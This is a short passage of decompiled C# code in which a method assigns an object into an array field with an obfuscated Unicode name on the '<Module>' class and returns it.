      \u003CModule\u003E.ﮒ偺擐箆ᆔᡤಹӅ[num2] = obj;
    }
    return obj;
  }
}
